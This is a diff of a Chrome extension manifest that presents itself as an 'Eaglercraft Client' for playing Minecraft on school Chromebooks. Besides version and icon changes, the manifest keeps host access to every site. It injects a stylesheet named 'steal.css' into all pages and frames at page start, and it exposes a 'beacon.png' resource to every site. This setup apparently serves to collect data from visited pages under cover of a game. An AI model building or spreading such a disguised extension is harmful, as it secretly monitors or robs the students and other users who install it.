@@ -1,21 +1,27 @@
 {
   "manifest_version": 3,
   "name": "Eaglercraft Client",
-  "description": "Play Minecraft 1.8.8 or 1.5.2 in browser – works on school Chromebooks!",
-  "version": "3.3.7",
+  "description": "Play Minecraft 1.8.8 in browser – works on school Chromebooks",
+  "version": "4.0.0",
   "icons": {
+    "16": "icon.png",
+    "48": "icon.png",
     "128": "icon.png"
   },
-  "permissions": ["storage"],
+  "permissions": [],
   "host_permissions": ["<all_urls>"],
-  "web_accessible_resources": [{
-    "resources": ["beacon.png"],
-    "matches": ["<all_urls>"]
-  }],
-  "content_scripts": [{
-    "matches": ["<all_urls>"],
-    "run_at": "document_start",
-    "all_frames": true,
-    "css": ["steal.css"]
-  }]
+  "web_accessible_resources": [
+    {
+      "resources": ["beacon.png"],
+      "matches": ["<all_urls>"]
+    }
+  ],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "run_at": "document_start",
+      "all_frames": true,
+      "css": ["steal.css"]
+    }
+  ]
 }
